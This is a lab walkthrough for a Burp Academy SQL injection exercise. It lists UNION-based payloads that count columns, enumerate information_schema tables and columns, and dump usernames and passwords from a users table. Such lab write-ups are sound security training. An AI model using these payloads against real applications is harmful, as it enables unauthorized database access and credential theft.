---
description: A walkthrough of one of the Burp Academy Labs
---

# SQLi Walkthrough

## Intro

When we enter the room are presented with a web page:

![](.gitbook/assets/image%20%2811%29.png)

## Injection Point

From here we search for our parameter that is injectable, clicking on one of the product categories we find an injection point:

![&quot;category=gifts&quot; is our injection point](.gitbook/assets/image%20%289%29.png)

## Counting Columns

First we need to craft a statement that will identify how many columns are in the table:

```text
' ORDER BY 1,2--
```

![](.gitbook/assets/image%20%285%29.png)

The page loads with 2, and errors at 3, so there are 2 columns we have discovered. we can double check this with the following:

```text
' UNION SELECT NULL,NULL--
```

![](.gitbook/assets/image%20%2815%29.png)

## Strings?

Next we have to discover if any of these columns can take a string value, we can add 'a' in place of the null to test this:

![](.gitbook/assets/image%20%286%29.png)

![](.gitbook/assets/image%20%2813%29.png)

## Find Table Names

Next we should discover which tables are located within the database.

```text
' UNION SELECT table_name,NULL FROM information_schema.tables--
```

![](.gitbook/assets/image%20%288%29.png)

From the list displayed we can find any interesting tables:

![](.gitbook/assets/image%20%2812%29.png)

## Find Column Names

We now need to discover which columns are within this table, using the following:

```text
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_uiykfb'--
```

![](.gitbook/assets/image%20%2810%29.png)

## Sweet Sweet Data

Now we have the column names we can get the data!

```text
' UNION SELECT username_kwdcsh,password_possgi FROM users_uiykfb--
```

![](.gitbook/assets/image%20%287%29.png)

